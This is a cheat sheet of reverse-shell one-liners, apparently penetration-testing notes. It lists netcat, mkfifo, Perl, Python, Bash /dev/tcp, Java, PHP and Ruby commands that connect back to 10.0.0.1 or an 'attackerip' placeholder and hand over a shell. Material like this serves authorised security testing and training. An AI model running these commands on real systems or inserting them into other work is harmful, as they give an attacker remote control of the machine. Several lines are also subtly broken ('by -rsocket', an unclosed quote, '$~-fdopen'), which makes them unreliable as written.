# path to reverse shells on kali linux
/usr/share/webshell/php

# create reverse shell
# nc: listening host
nc -lvp 4444
# nc: Linux reverse shell
nc 10.0.0.1 1234 -e /bin/sh

# nc: Windows reverse shell
nc 10.0.0.1 1234 -e cmd.exe

# nc: Netcat workaround when -e option not possible
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f

# nc: target machine (windows)
nc -nv ipAddress 4444 -e cmd.exe

# nc: target machine (unix)
nc -nv ipAddress 4444 -e /bin/sh

# python: upgrade a netcat shell                                                           
python -c 'import pty; pty.spawn("/bin/bash")'

# move the reverse shell into the background
<Ctrl-Z>

# move the reverse shell into the foreground
fg <enter><enter>

# perl: shell
perl -e 'use Socket; $i="10.0.0.1"; $p=1234; socket(S,PF_INET, SOCK_STREAM, getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))) { open(STDIN,">&S") ; open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh - i");};'

# perl: Perl without /bin/sh
perl -MIO -e '$p=fork;exit,if($p);$c=new
IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~-fdopen($c,w) ;system $_i while<>;'

# perl: Windows
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w) ; system$_while<>;'

# python
python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.0.0.1", 1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i]);'

# Bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

# Java
r = Runtime.getRuntime()
p = r.exec( ["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

# PHP
php -r '$sock=fsockopen("10.0.0.1", 1234) ; exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Ruby without /bin/sh
by -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd, "r"){|io|c.print io.read} end'

# Ruby for Windows
ruby -rsocket -e
'c=TCPSocket.new("attackerIp","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
